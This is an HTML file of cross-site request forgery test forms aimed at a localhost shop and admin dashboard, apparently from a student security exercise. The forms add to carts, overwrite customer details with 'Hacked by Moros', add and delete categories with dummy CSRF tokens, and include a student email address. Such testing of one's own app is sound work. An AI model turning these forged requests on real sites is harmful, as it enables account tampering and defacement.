<form action="http://localhost:8092/Cart/AddProduct" method="post">
    <meta name="referrer" content="origin" />
    <input type="text" name="product_code" value="SP1701946810">
    <input type="text" name="size" value="M">
    <input type="text" name="quantity" value="1">
    <button type="submit"></button>
</form>
<br>
<form action="http://localhost:8092/Cart/ProductInCart" method="post">
    <meta name="referrer" content="origin" />
    <input type="text" name="product_code" value="SP1701946810">
    <input type="text" name="sizeOfProduct" value="M">
    <input type="text" name="actionWithProduct" value="increase">
    <button type="submit"></button>
</form>
<br>
<form action="http://localhost:8092/Customer/EditInfo" method="post">
    <input value="Hacked by Moros" name="fullName" type="text">
    <input value="07078885551" type="text" name="phone">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<br>
<form action="http://localhost:8090/Dashboard_category/AddCategory" method="post">
    <input type="text" name="csrf_token_category" value="csrf_token_category">
    <input value="Hacked by Moros" name="CategoryName" type="text">
    <input value="1" type="text" name="CategoryParentID">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<form action="http://localhost:8090/Dashboard_category/DeleteCategory" method="post">
    <input type="text" name="csrf_token_category" value="csrf_token_category">
    <input value="18" type="text" name="category_id">
    <button class="btn btn--large" type="submit">Cập nhật</button>
</form>
<br>
<form action="http://localhost:8090/Dashboard_customer/Edit" method="post">
<input type="text" name="csrf_token_customer" value="csrf_token_customer">
<input style="color: black" type="text" value="n20dcat004@student.ptithcm.edu.vn" id="Email" name="Email">
<input style="color: black" type="text" value="Hacked by Moros" id="TenKhachHang" name="TenKhachHang">
<input style="color: black" type="text" value="07078885551" id="SDT" name="SDT">
<button type="submit" id="submitBtn">Thêm</button>
</form>
